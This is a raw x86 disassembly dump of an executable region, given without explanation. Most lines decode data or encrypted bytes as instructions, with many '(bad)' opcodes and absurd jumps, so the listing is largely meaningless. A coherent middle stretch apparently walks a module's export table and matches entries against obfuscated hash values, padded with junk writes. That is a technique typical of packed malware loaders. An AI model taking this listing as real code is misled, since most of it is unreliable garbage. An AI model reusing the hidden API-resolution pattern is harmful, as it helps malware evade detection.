  40475a:	push   ebx
  40475b:	inc    esi
  40475c:	lock test BYTE PTR [ecx-0x1c74d3d5],cl
  404763:	test   DWORD PTR [ecx],eax
  404765:	bound  esp,QWORD PTR cs:[ecx]
  404768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404769:	retf   0x4c42
  40476c:	addr16 test eax,0x687c814b
  404772:	aaa    
  404773:	(bad)  
  404774:	mov    eax,ds:0x487100d9
  404779:	in     al,0x3a
  40477b:	push   ds
  40477c:	cmp    dh,BYTE PTR [eax-0x6368f239]
  404782:	int3   
  404783:	mov    ebx,gs
  404785:	idiv   BYTE PTR [ebx-0x2f]
  404788:	pushf  
  404789:	jmp    0x731d9679
  40478e:	mov    dh,0x1e
  404790:	mov    esp,0x96a00201
  404795:	push   cs
  404796:	inc    ebx
  404797:	aam    0x4b
  404799:	retf   
  40479a:	out    0xef,al
  40479c:	loop   0x4047a7
  40479e:	sbb    DWORD PTR ds:0x477e676d,edi
  4047a4:	jmp    0x404780
  4047a6:	xor    bl,al
  4047a8:	push   0xffffffda
  4047aa:	or     ebx,edi
  4047ac:	(bad)  
  4047ad:	fdiv   st(4),st
  4047af:	xchg   esi,eax
  4047b0:	scas   al,BYTE PTR es:[edi]
  4047b1:	xchg   ebp,eax
  4047b2:	fidivr WORD PTR [ebx+0x4a]
  4047b5:	ret    0xbb0
  4047b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047b9:	int    0x80
  4047bb:	or     BYTE PTR [esi],ah
  4047bd:	fdivr  QWORD PTR ds:[edx+0x316a9045]
  4047c4:	jl     0x404825
  4047c6:	outs   dx,BYTE PTR ds:[esi]
  4047c7:	sub    BYTE PTR [esi+0x1d],bh
  4047ca:	pop    eax
  4047cb:	mov    esi,0xa1d1813b
  4047d0:	cmp    ah,BYTE PTR ds:0xb4c38bc8
  4047d6:	pop    esi
  4047d7:	dec    eax
  4047d8:	add    bh,0x66
  4047db:	push   ecx
  4047dc:	idiv   ch
  4047de:	iret   
  4047df:	xrelease xchg DWORD PTR [eax+0x1],eax
  4047e3:	inc    eax
  4047e4:	sti    
  4047e5:	push   eax
  4047e6:	ret    
  4047e7:	in     eax,0xcc
  4047e9:	aam    0x48
  4047eb:	mov    es,WORD PTR [ebx-0x2d]
  4047ee:	fdivr  QWORD PTR [ebp+0x6cf8298c]
  4047f4:	ja     0x404780
  4047f6:	add    al,0xc4
  4047f8:	test   BYTE PTR [edi+0x2f],ah
  4047fb:	call   0x36d6:0x44149d13
  404802:	sub    bh,BYTE PTR [ebx]
  404804:	fimul  WORD PTR [ecx]
  404806:	jge    0x40487b
  404808:	ins    BYTE PTR es:[edi],dx
  404809:	cli    
  40480a:	sbb    dl,dh
  40480c:	dec    ecx
  40480d:	cmc    
  40480e:	lods   eax,DWORD PTR ds:[esi]
  40480f:	xchg   ecx,eax
  404810:	ret    
  404811:	mov    ds:0x7b549fb1,eax
  404816:	stc    
  404817:	sbb    al,BYTE PTR [eax]
  404819:	push   es
  40481a:	mov    ds:0x8fcfa703,al
  40481f:	sub    BYTE PTR [eax-0xf155be6],ch
  404825:	adc    esi,edi
  404827:	fistp  WORD PTR [ebx]
  404829:	sub    al,0x33
  40482b:	cdq    
  40482c:	add    ecx,DWORD PTR [esi+ecx*1-0x67826f02]
  404833:	in     al,dx
  404834:	inc    eax
  404835:	fimul  DWORD PTR [ecx-0x19]
  404838:	add    eax,0xdcafefcb
  40483d:	out    dx,eax
  40483e:	jecxz  0x4047c1
  404840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404841:	inc    esi
  404842:	in     al,dx
  404843:	push   esi
  404844:	adc    al,0x5e
  404846:	mov    bh,0x22
  404848:	mov    bl,0x77
  40484a:	add    BYTE PTR [esi-0xb],dh
  40484d:	and    al,0x9b
  40484f:	jno    0x40482e
  404851:	mov    BYTE PTR [edi+0x7f],cl
  404854:	sbb    DWORD PTR [ebp-0x57],eax
  404857:	xor    eax,0x8b5dbb74
  40485c:	pop    esp
  40485d:	jecxz  0x404892
  40485f:	stos   BYTE PTR es:[edi],al
  404860:	mov    ?,ebp
  404862:	push   0x3d
  404864:	dec    esi
  404865:	push   esi
  404866:	popa   
  404867:	ins    DWORD PTR es:[edi],dx
  404868:	call   0xdc10:0x1b1228fc
  40486f:	jb     0x40485b
  404871:	sbb    bh,BYTE PTR [ecx-0x3580ca5d]
  404877:	aad    0x4c
  404879:	lock inc esp
  40487b:	inc    ebx
  40487c:	xchg   ecx,esp
  40487e:	pop    edx
  40487f:	jmp    0x60f7187a
  404884:	iret   
  404885:	add    al,0x25
  404887:	pushf  
  404888:	es lock jp 0x404904
  40488c:	(bad)  
  40488e:	test   DWORD PTR ds:0xfd6474c7,ebx
  404894:	sub    BYTE PTR [ebx-0x1e],0x4f
  404898:	div    dl
  40489a:	xchg   edi,eax
  40489b:	retf   
  40489c:	test   eax,0x1e0e5da8
  4048a1:	mov    esp,0xa081c311
  4048a6:	arpl   bp,sp
  4048a8:	into   
  4048a9:	retf   0xfa8a
  4048ac:	in     eax,0xc2
  4048ae:	mov    esp,0x94139ed3
  4048b3:	lods   al,BYTE PTR ds:[esi]
  4048b4:	cmc    
  4048b5:	xchg   ebp,eax
  4048b6:	int3   
  4048b7:	dec    eax
  4048b8:	xchg   DWORD PTR [ebp-0x22acc683],esp
  4048be:	mov    edx,0x87f9bf46
  4048c3:	dec    DWORD PTR ds:0xe53550bc
  4048c9:	loopne 0x4048bd
  4048cb:	pop    esi
  4048cc:	(bad)  
  4048ce:	outs   dx,DWORD PTR ds:[esi]
  4048cf:	jae    0x40486e
  4048d1:	jnp    0x404917
  4048d3:	data16 sub BYTE PTR [eax-0x6f],ch
  4048d7:	test   eax,0xfd537b66
  4048dc:	nop
  4048dd:	test   DWORD PTR [esi],edx
  4048df:	jbe    0x40487a
  4048e1:	xchg   DWORD PTR [edx],eax
  4048e3:	les    esp,FWORD PTR [ebx+0x7d]
  4048e6:	adc    ah,BYTE PTR [ebp-0x28]
  4048e9:	jno    0x404906
  4048eb:	fldcw  WORD PTR ds:0x5e5ea069
  4048f1:	stos   DWORD PTR es:[edi],eax
  4048f2:	push   edx
  4048f3:	xor    al,0xd
  4048f5:	mov    ecx,0x7024ad72
  4048fa:	sbb    DWORD PTR [esi-0x40],0x580f4fc3
  404901:	jno    0x4048dd
  404903:	ds sub ebp,ecx
  404906:	cmp    al,BYTE PTR ds:0xeb4dffa5
  40490c:	lea    esi,[eax]
  40490e:	mov    eax,ds:0x19b16d0a
  404913:	mov    bl,0x82
  404915:	lahf   
  404916:	jg     0x404925
  404918:	loope  0x404967
  40491a:	inc    esp
  40491b:	push   esi
  40491c:	in     eax,0x97
  40491e:	adc    edi,DWORD PTR [esi-0x1395f63]
  404924:	repz iret 
  404926:	fwait
  404927:	aas    
  404928:	in     al,0xd1
  40492a:	add    BYTE PTR ds:0xbb8421dd,dh
  404930:	(bad)
  404934:	scas   al,BYTE PTR es:[edi]
  404935:	cmp    edi,DWORD PTR [eax+0x5ef80c98]
  40493b:	aas    
  40493c:	pop    edi
  40493d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40493e:	or     eax,0xb8672e05
  404943:	dec    esi
  404944:	mov    WORD PTR [esp+edi*2+0x57],?
  404948:	ret    0x990d
  40494b:	fldenv [eax]
  40494d:	call   0x479e:0x9734dbe9
  404954:	jo     0x4049bf
  404956:	stc    
  404957:	sbb    DWORD PTR [ecx-0x432cbe8f],edi
  40495d:	push   ebp
  40495e:	pop    ebp
  40495f:	mov    eax,0x6b014a3f
  404964:	pop    ebx
  404965:	(bad)  
  404966:	nop
  404967:	inc    edi
  404968:	mov    ds:0xc96db0d0,eax
  40496d:	sbb    BYTE PTR [esi+0x5e9f42df],ch
  404973:	icebp  
  404974:	mov    dh,0xc1
  404976:	retf   
  404977:	pop    DWORD PTR [eax]
  404979:	mov    ch,0x8f
  40497b:	scas   eax,DWORD PTR es:[edi]
  40497c:	pusha  
  40497d:	push   ecx
  40497e:	ret    0x2648
  404981:	push   ebp
  404982:	or     dh,BYTE PTR [edx-0x5508262a]
  404988:	stc    
  404989:	xchg   esi,eax
  40498a:	jno    0x40494d
  40498c:	sbb    eax,0x2dd509e
  404991:	push   ebp
  404992:	sbb    dh,bh
  404994:	sub    eax,0x4857147a
  404999:	add    edi,DWORD PTR [eax]
  40499b:	mov    BYTE PTR [eax+eax*1-0x60f6c438],ch
  4049a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049a3:	fistp  WORD PTR [edx-0x5b]
  4049a6:	bnd ja 0x4049a3
  4049a9:	nop
  4049aa:	(bad)  [edi+0xf6af199]
  4049b0:	es dec ebp
  4049b2:	iret   
  4049b3:	sbb    dh,BYTE PTR [eax+0x65]
  4049b6:	sti    
  4049b7:	int3   
  4049b8:	push   edx
  4049b9:	aas    
  4049ba:	push   DWORD PTR [edi-0x61]
  4049bd:	or     al,0xe1
  4049bf:	mov    dl,0x39
  4049c1:	jno    0x404947
  4049c3:	jle    0x40498f
  4049c5:	lds    ecx,FWORD PTR [edi]
  4049c7:	fist   DWORD PTR [ebx+0x6f]
  4049ca:	(bad)  
  4049cc:	mov    ecx,0xfdb41b49
  4049d1:	jle    0x404a09
  4049d3:	cdq    
  4049d4:	pop    ss
  4049d5:	adc    al,0x5
  4049d7:	(bad)  
  4049d8:	shl    eax,1
  4049da:	ds pop ebp
  4049dc:	xor    cl,ch
  4049de:	mov    bh,0xc
  4049e0:	adc    eax,0x8891c67e
  4049e5:	in     eax,dx
  4049e6:	sahf   
  4049e7:	idiv   BYTE PTR [edi]
  4049e9:	test   DWORD PTR ds:0xbda21b96,0x31c53de9
  4049f3:	or     al,0x33
  4049f5:	shr    DWORD PTR [esi-0x44ca87e],cl
  4049fb:	js     0x404a2d
  4049fd:	mov    al,0x6c
  4049ff:	icebp  
  404a00:	inc    esp
  404a01:	or     ebx,DWORD PTR [eax-0x25]
  404a04:	jae    0x4049f3
  404a06:	out    0xd5,eax
  404a08:	dec    esp
  404a09:	add    ch,BYTE PTR [esi]
  404a0b:	idiv   BYTE PTR [ebx+esi*2-0x59]
  404a0f:	cs add ch,bh
  404a12:	dec    eax
  404a13:	xor    eax,0xfc3e7f64
  404a18:	daa    
  404a19:	pop    ds
  404a1a:	pop    ecx
  404a1b:	sub    DWORD PTR [edx-0x3792f139],eax
  404a21:	lods   al,BYTE PTR ds:[esi]
  404a22:	pop    ss
  404a23:	sub    bl,BYTE PTR [ecx+0x4b9de579]
  404a29:	cs iret 
  404a2b:	(bad)  
  404a2d:	jecxz  0x4049b6
  404a2f:	or     eax,0x3cfd4f12
  404a34:	or     ecx,0xffffffff
  404a37:	loop   0x4049c8
  404a39:	xor    ebx,esi
  404a3b:	shr    BYTE PTR [edi],1
  404a3d:	scas   al,BYTE PTR es:[edi]
  404a3e:	(bad)  
  404a40:	sub    al,0xd4
  404a42:	pop    es
  404a43:	sub    DWORD PTR [edx-0xf28cb83],ebx
  404a49:	div    bh
  404a4b:	pop    edi
  404a4c:	xchg   ebx,eax
  404a4d:	jge    0x404a24
  404a4f:	test   BYTE PTR [eax+eax*8],0x8c
  404a53:	dec    ebx
  404a54:	and    DWORD PTR [ebp+0x52],ebx
  404a57:	mov    ebx,0x3ce776d4
  404a5c:	mov    edi,0xa3df903d
  404a61:	sahf   
  404a62:	test   al,0xe9
  404a64:	sbb    eax,0x74e83cd
  404a69:	cmp    al,0x74
  404a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a6d:	nop
  404a6e:	cld    
  404a6f:	add    DWORD PTR [edi],ebp
  404a71:	stos   DWORD PTR es:[edi],eax
  404a72:	ret    0xd3ae
  404a75:	aam    0x4
  404a77:	enter  0x28df,0x45
  404a7b:	mov    ah,0xba
  404a7d:	fsub   QWORD PTR [ebx+esi*8]
  404a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a81:	add    bh,bl
  404a83:	sub    eax,0xd5f8239c
  404a88:	mov    ch,0x91
  404a8a:	sbb    al,dl
  404a8c:	sub    bl,dl
  404a8e:	mov    ch,0x59
  404a90:	ds cmc 
  404a92:	es ja  0x404ade
  404a95:	into   
  404a96:	push   ebx
  404a97:	jg     0x404a1f
  404a99:	or     al,0x5d
  404a9b:	xchg   esi,eax
  404a9c:	les    ebp,FWORD PTR [edi+0x7a]
  404a9f:	xor    DWORD PTR [ebp-0x552e4b19],esi
  404aa5:	data16 loope 0x404b0a
  404aa8:	repnz int 0x2
  404aab:	loope  0x404ac5
  404aad:	cwde   
  404aae:	cld    
  404aaf:	mov    WORD PTR [esi-0x1e6256ae],es
  404ab5:	and    ebp,DWORD PTR [edi-0x46]
  404ab8:	mov    edi,0xd4e8f1e3
  404abd:	jge    0x404a46
  404abf:	lea    esi,[bp+di-0x31]
  404ac3:	inc    ebp
  404ac4:	(bad)  
  404ac5:	sbb    BYTE PTR [ebx],dl
  404ac7:	sbb    eax,0x26863db3
  404acc:	pop    esi
  404acd:	push   cs
  404ace:	sub    eax,edx
  404ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad2:	stos   DWORD PTR es:[edi],eax
  404ad3:	in     al,0xce
  404ad5:	loop   0x404a73
  404ad7:	call   0xaf83:0x21f67ea1
  404ade:	sahf   
  404adf:	loop   0x404a6f
  404ae1:	cmc    
  404ae2:	cld    
  404ae3:	add    dl,BYTE PTR [eax-0x4485bd6c]
  404ae9:	adc    eax,0x50a596da
  404aee:	add    ch,dh
  404af0:	jg     0x404b3e
  404af2:	xor    dh,BYTE PTR [edi+esi*8+0x3e5664aa]
  404af9:	loop   0x404b50
  404afb:	hlt    
  404afc:	push   cs
  404afd:	cmp    DWORD PTR [eax-0x21],ecx
  404b00:	adc    edx,esp
  404b02:	pop    edx
  404b03:	loop   0x404b75
  404b05:	dec    ebp
  404b06:	fsubr  QWORD PTR [edx]
  404b08:	xchg   BYTE PTR [esi+0xd],ch
  404b0b:	mov    dl,0x32
  404b0d:	iret   
  404b0e:	or     DWORD PTR [eax],ebx
  404b10:	xchg   dl,ch
  404b12:	in     eax,0xc6
  404b14:	and    ah,BYTE PTR [edx+0xb4062b8]
  404b1a:	cs mov ds,edi
  404b1d:	push   ds
  404b1e:	out    dx,al
  404b1f:	(bad)  [ebx+0x53]
  404b22:	push   cs
  404b23:	sar    DWORD PTR [ecx-0x61],cl
  404b26:	push   ebp
  404b27:	push   esp
  404b28:	jmp    0x63e1ffeb
  404b2d:	bound  ebx,QWORD PTR [esi]
  404b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b30:	mov    eax,0x241de496
  404b35:	fst    st(0)
  404b37:	jae    0x404b30
  404b39:	jl     0x404b82
  404b3b:	push   cs
  404b3c:	pop    ebx
  404b3d:	in     al,dx
  404b3e:	data16 (bad) 
  404b40:	(bad)  
  404b42:	sbb    BYTE PTR [eax],bh
  404b44:	jmp    0xa7d3:0xa67ad6a4
  404b4b:	fstp   DWORD PTR [esi+0x4ce4b841]
  404b51:	mov    ch,0x57
  404b53:	je     0x404bb8
  404b55:	and    DWORD PTR [edx+0x26240451],ecx
  404b5b:	or     eax,0x9e8d3b27
  404b60:	dec    esi
  404b61:	jle    0x404b34
  404b63:	out    dx,eax
  404b64:	pop    ebx
  404b65:	fldenv [edi-0x3b]
  404b68:	xor    eax,0xf62bf207
  404b6d:	jnp    0x404bee
  404b6f:	jns    0x404bb6
  404b71:	sub    esp,DWORD PTR [edi+0x41]
  404b74:	and    al,0x28
  404b76:	push   0x57888d23
  404b7b:	sbb    al,0xa8
  404b7d:	(bad)  
  404b7e:	pushf  
  404b7f:	fcmove st,st(4)
  404b81:	adc    BYTE PTR [edi],cl
  404b83:	jb     0x404b58
  404b85:	stos   DWORD PTR es:[edi],eax
  404b86:	hlt    
  404b87:	das    
  404b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b89:	or     al,0x73
  404b8b:	jbe    0x404b80
  404b8d:	sbb    BYTE PTR [ebx+edi*8],0x6b
  404b91:	mov    al,ds:0x719733a4
  404b96:	inc    esi
  404b97:	push   ecx
  404b98:	jb     0x404b3a
  404b9a:	dec    ebx
  404b9b:	mov    ds,WORD PTR [ebx-0xf2f1a3d]
  404ba1:	bound  esp,QWORD PTR [edx]
  404ba3:	push   ebx
  404ba4:	pop    es
  404ba5:	lock ja 0x404ba7
  404ba8:	jp     0x404be0
  404baa:	repz ret 0x2170
  404bae:	xchg   ebp,eax
  404baf:	scas   eax,DWORD PTR es:[edi]
  404bb0:	popa   
  404bb1:	into   
  404bb2:	push   eax
  404bb3:	iret   
  404bb4:	inc    esi
  404bb5:	scas   eax,DWORD PTR es:[edi]
  404bb6:	pusha  
  404bb7:	lea    ebx,[si-0x741c]
  404bbc:	push   edi
  404bbd:	push   esi
  404bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bbf:	es mov dh,0x71
  404bc2:	jno    0x404c26
  404bc4:	out    0x5a,al
  404bc6:	sbb    eax,0x49e1573e
  404bcb:	in     al,0x2c
  404bcd:	xor    BYTE PTR [esi+0x2510c4bb],dh
  404bd3:	add    BYTE PTR [di],al
  404bd6:	adc    ebx,DWORD PTR [ebx]
  404bd8:	(bad)  
  404bd9:	shl    ah,cl
  404bdb:	dec    ecx
  404bdc:	lea    ebp,[eax+0x4ed81ae1]
  404be2:	pop    es
  404be3:	mov    cs,eax
  404be5:	xchg   esp,eax
  404be6:	push   cs
  404be7:	push   ebp
  404be8:	rol    ecx,cl
  404bea:	shr    esi,0xc3
  404bed:	cmc    
  404bee:	pop    ebp
  404bef:	mov    al,ss:0xb7807441
  404bf5:	cmp    dl,BYTE PTR [esi-0x3e]
  404bf8:	jle    0x404c51
  404bfa:	test   DWORD PTR [edi+0x52],ecx
  404bfd:	inc    ebp
  404bfe:	scas   eax,DWORD PTR es:[edi]
  404bff:	es xchg ebp,eax
  404c01:	lock pop ds
  404c03:	add    DWORD PTR [esi],ecx
  404c05:	int3   
  404c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c08:	jbe    0x404c02
  404c0a:	gs ss add al,0xf2
  404c0e:	ficomp DWORD PTR [eax+0x4059ac63]
  404c14:	(bad)  
  404c15:	(bad)  
  404c16:	pop    ss
  404c17:	fwait
  404c18:	and    BYTE PTR [eax],0x62
  404c1b:	sbb    al,0x7e
  404c1d:	pop    ecx
  404c1e:	and    eax,DWORD PTR [ebx+0x32]
  404c21:	add    BYTE PTR [ecx-0x470ef153],0x3c
  404c28:	mov    DWORD PTR [ebp+0x71d0cda6],ebx
  404c2e:	aam    0x53
  404c30:	dec    edi
  404c31:	add    ecx,DWORD PTR [ebx]
  404c33:	cld    
  404c34:	scas   eax,DWORD PTR es:[edi]
  404c35:	iret   
  404c36:	int3   
  404c37:	push   esp
  404c38:	gs loop 0x404c2b
  404c3b:	cvttps2pi mm0,xmm0
  404c3e:	sahf   
  404c3f:	jbe    0x404c32
  404c41:	xor    edx,DWORD PTR es:[edx+0x56]
  404c45:	push   esi
  404c46:	sub    esi,DWORD PTR [esi+0x1c295fe]
  404c4c:	cld    
  404c4d:	inc    esp
  404c4e:	xchg   edx,eax
  404c4f:	mov    bl,0x12
  404c51:	cmp    edi,DWORD PTR [edi]
  404c53:	cmp    eax,0x458b7988
  404c58:	cld    
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	push   esi
  404e97:	dec    esp
  404e98:	adc    edx,DWORD PTR [edi]
  404e9a:	or     bl,BYTE PTR [edi+0x7a]
  404e9d:	jp     0x404ea9
  404e9f:	pop    edi
  404ea0:	jp     0x404f1c
  404ea2:	pusha  
  404ea3:	mov    edx,0xef9fd447
  404ea8:	stos   DWORD PTR es:[edi],eax
  404ea9:	lods   eax,DWORD PTR ds:[esi]
  404eaa:	out    0xc2,eax
  404eac:	mov    ds:0x4c1db23b,al
  404eb1:	cmp    edx,DWORD PTR [ebx-0x22]
  404eb4:	xor    ebp,DWORD PTR [ebx+0x50acec59]
  404eba:	daa    
  404ebb:	push   ds
  404ebc:	push   0xeb6785bc
  404ec1:	mov    edx,0x3e6ede04
  404ec6:	or     DWORD PTR [edi-0x2056547e],ebx
  404ecc:	fcmove st,st(4)
  404ece:	leave  
  404ecf:	mov    bl,0x97
  404ed1:	rol    BYTE PTR [ecx-0x6a],cl
  404ed4:	cdq    
  404ed5:	dec    esp
  404ed6:	fwait
  404ed7:	aas    
  404ed8:	and    DWORD PTR [edx+0x752c53eb],ecx
  404ede:	cmp    DWORD PTR fs:[ecx],ebx
  404ee1:	daa    
  404ee2:	xor    esi,DWORD PTR [esi]
  404ee4:	pusha  
  404ee5:	or     DWORD PTR [ecx-0x39],ecx
  404ee8:	fist   DWORD PTR [ebp+0x7b87fddc]
  404eee:	xchg   DWORD PTR [eax+0x7694bf7],ecx
  404ef4:	es xchg ebp,eax
  404ef6:	gs mov dh,0xc3
  404ef9:	setnp  BYTE PTR [edx-0xc74b21c]
  404f00:	jbe    0x404f77
  404f02:	dec    ebx
  404f03:	jg     0x404e90
  404f05:	hlt    
  404f06:	fsub   DWORD PTR [edx]
  404f08:	xchg   ebp,eax
  404f09:	push   eax
  404f0a:	xor    dl,BYTE PTR [esi]
  404f0c:	lods   al,BYTE PTR ds:[esi]
  404f0d:	out    0xa9,eax
  404f0f:	add    al,0x5a
  404f11:	xor    esi,ebx
  404f13:	and    eax,0x844cf138
  404f18:	ror    cl,cl
  404f1a:	pop    esp
  404f1b:	gs mov al,al
  404f1e:	sbb    DWORD PTR [ebp-0x13],edx
  404f21:	das    
  404f22:	cld    
  404f23:	test   BYTE PTR [eax+0x28db0b88],dh
  404f29:	sbb    DWORD PTR [esi+0x6255ece8],edx
  404f2f:	mov    eax,ds:0x996bd898
  404f34:	pop    ss
  404f35:	inc    esi
  404f36:	rcl    al,0x64
  404f39:	or     BYTE PTR [ebx],dh
  404f3b:	cmp    DWORD PTR [esi+0x2207caa1],edi
  404f41:	xchg   esp,edi
  404f43:	fnsave [edx+0x71]
  404f46:	jp     0x404f65
  404f48:	xchg   edx,eax
  404f49:	imul   eax,DWORD PTR [edi+0x4297f17f],0x47
  404f50:	jne    0x404f04
  404f52:	jnp    0x404f2c
  404f54:	xchg   DWORD PTR [edi+0x54],edx
  404f57:	mov    ebp,0x1692ba4c
  404f5c:	mov    cl,0x8e
  404f5e:	mul    BYTE PTR [esp+eax*1-0x50]
  404f62:	pop    eax
  404f63:	lods   eax,DWORD PTR ds:[esi]
  404f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f65:	jge    0x404fa9
  404f67:	sub    DWORD PTR [ecx-0x41eacd0c],esp
  404f6d:	xchg   esi,eax
  404f6e:	xchg   edx,eax
  404f6f:	(bad)  
